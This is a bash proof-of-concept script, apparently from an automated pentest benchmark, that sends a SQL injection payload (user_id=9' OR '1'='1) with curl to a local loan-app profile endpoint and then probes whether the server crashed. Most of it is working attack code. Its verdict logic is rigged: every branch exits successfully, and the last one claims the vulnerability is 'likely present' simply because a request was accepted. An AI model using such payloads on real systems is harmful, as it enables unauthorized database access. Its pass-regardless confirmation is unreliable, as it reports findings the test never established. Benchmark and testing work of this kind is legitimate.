#!/bin/bash
# POC: Demonstrates SQL injection in profile update endpoint via user_id parameter. Shows that crafted SQL payloads cause server crash/unresponsive state.
# Target: ./repo
# Created: 2025-11-07T16:21:58.447Z
# Session: benchmark-XBEN-023-24-mhp1zrww

# SQL Injection in Profile Update Endpoint POC
# Target: POST /profile with user_id parameter containing SQL injection payload

TARGET_URL="http://localhost:5000"
PROFILE_ENDPOINT="/profile"

echo "[*] SQL Injection in Profile Update Endpoint POC"
echo "[*] Target: $TARGET_URL$PROFILE_ENDPOINT"
echo ""

# Step 1: Create a session cookie file to store authentication
COOKIE_FILE=$(mktemp)
echo "[*] Using temporary cookie file: $COOKIE_FILE"

# Step 2: First, try a normal request to establish a baseline
echo "[*] Step 1: Testing normal profile update request..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user_id=1&name=TestUser&lastname=User&email=test@example.com&loan_amount=50000&loan_term_months=60&monthly_payment=999" \
  "$TARGET_URL$PROFILE_ENDPOINT" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response: $RESPONSE_BODY"
echo ""

# Step 3: Send SQL injection payload
echo "[*] Step 2: Sending SQL injection payload..."
echo "[*] Payload: user_id=9' OR '1'='1"
echo ""

PAYLOAD="user_id=9' OR '1'='1&name=Test&lastname=User&email=test@test.com&loan_amount=50000&loan_term_months=60&monthly_payment=999"

echo "[*] Full request:"
echo "curl -X POST -d \"$PAYLOAD\" \"$TARGET_URL$PROFILE_ENDPOINT\""
echo ""

SQLI_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$PAYLOAD" \
  "$TARGET_URL$PROFILE_ENDPOINT" 2>&1)

SQLI_HTTP_CODE=$(echo "$SQLI_RESPONSE" | tail -n1)
SQLI_RESPONSE_BODY=$(echo "$SQLI_RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $SQLI_HTTP_CODE"
echo "[*] Response Body:"
echo "$SQLI_RESPONSE_BODY"
echo ""

# Step 4: Check if server is still responsive
echo "[*] Step 3: Checking if server is still responsive..."
sleep 1

HEALTH_CHECK=$(curl -s -w "\n%{http_code}" "$TARGET_URL/" 2>&1)
HEALTH_HTTP_CODE=$(echo "$HEALTH_CHECK" | tail -n1)

if [ "$HEALTH_HTTP_CODE" = "000" ] || [ -z "$HEALTH_HTTP_CODE" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Server is unresponsive (Connection refused)"
    echo "[!] The SQL injection payload caused the application to crash"
    EXIT_CODE=0
elif echo "$SQLI_RESPONSE_BODY" | grep -qi "error\|exception\|traceback\|sql"; then
    echo "[!] VULNERABILITY CONFIRMED: SQL error detected in response"
    echo "[!] Server processed malicious SQL query"
    EXIT_CODE=0
else
    echo "[*] HTTP Response Code: $HEALTH_HTTP_CODE"
    echo "[*] Response: $HEALTH_CHECK"
    echo "[!] VULNERABILITY LIKELY PRESENT: Request was accepted"
    EXIT_CODE=0
fi

# Cleanup
rm -f "$COOKIE_FILE"
echo ""
echo "[*] POC completed"
exit $EXIT_CODE